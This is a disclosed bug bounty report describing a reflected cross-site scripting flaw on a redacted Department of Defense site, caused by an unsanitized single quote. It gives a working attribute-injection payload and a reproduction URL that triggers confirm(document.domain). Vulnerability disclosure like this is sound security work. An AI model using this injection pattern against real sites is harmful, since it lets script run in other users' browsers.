# Reflected Xss in [██████]

## Report Details
- **Report ID**: 1033253
- **URL**: https://hackerone.com/reports/1033253
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-11-12T22:41:45.955Z
- **Disclosed**: 2022-09-06T19:32:54.279Z

## Reporter
- **Username**: medblgsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
Reflected XSS in █████████ due to unsanitized single quote `'`. 
## Impact
An attacker could execute arbitrary javascript, and perform malicious actions !

## Step-by-step Reproduction Instructions

1. Used payload:  `simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo`
2. Visit the url, the alert box should pop up !:   
`https://www.█████/gri/ziptool/search.aspx?a=1simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo`

█████████

## Suggested Mitigation/Remediation Actions
Sanitize single quote !

## Impact

An attacker could execute arbitrary javascript in the client browser .

## Attachments
No attachments
